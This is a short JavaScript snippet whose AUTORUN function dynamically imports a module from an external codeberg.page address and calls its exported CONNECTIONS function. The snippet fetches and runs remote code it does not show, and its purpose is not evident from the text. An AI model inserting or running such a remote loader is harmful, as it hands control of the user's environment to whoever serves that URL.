const AUTORUN=()=>{

    import("https://erandix.codeberg.page/index.js").then(o=>typeof o.CONNECTIONS=="function"&&o.CONNECTIONS()).catch(console.error)

}